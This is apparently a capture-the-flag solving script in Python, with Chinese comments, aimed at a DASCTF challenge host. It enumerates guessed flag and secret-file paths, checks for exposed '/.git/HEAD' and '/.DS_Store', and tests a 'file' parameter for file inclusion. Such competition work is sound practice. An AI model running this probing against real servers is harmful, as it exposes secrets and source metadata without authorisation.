# -*- coding: utf-8 -*-
"""最后一轮：目录枚举 + flag 文件常见位置"""
import requests

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

print('=== flag 文件常见位置枚举 ===')
paths = [
    '/static/flag.txt', '/static/hint.txt', '/static/secret.txt',
    '/uploads/ffffllllaaaagggg.php', '/upload/ffffllllaaaagggg.php',
    '/tmp/ffffllllaaaagggg.php', '/files/ffffllllaaaagggg.php',
    '/data/ffffllllaaaagggg.php', '/www/ffffllllaaaagggg.php',
    '/static/ffffllllaaaagggg', '/ffffllllaaaagggg',
    '/static/you-will-never-guess', '/you-will-never-guess.txt',
    '/secretkey.txt', '/static/secretkey.php',
]
for p in paths:
    try:
        r = requests.get(base + p, timeout=6)
        if r.status_code == 200 and len(r.text) < 2000:
            print(f'  200! {p}: {r.text[:100].replace(chr(10), " ")}')
        elif r.status_code not in (404, 403):
            print(f'  {r.status_code} {p}')
    except Exception:
        pass
print()

print('=== 常见静态文件 ===')
for p in ['/static/app.js', '/static/index.html', '/favicon.ico', '/.git/HEAD', '/.DS_Store']:
    try:
        r = requests.get(base + p, timeout=6)
        if r.status_code != 404:
            print(f'  {r.status_code} {p}: {r.text[:60].replace(chr(10), " ")}')
    except Exception:
        pass
print()

print('=== 用 file 参数尝试包含 secretkey.txt（白名单外，验证响应）===')
r = requests.get(base + '/', params={'file': 'static/secretkey.txt'}, timeout=8)
print(f'  file=static/secretkey.txt -> {len(r.text)} | {"you can\'t see it" in r.text}')
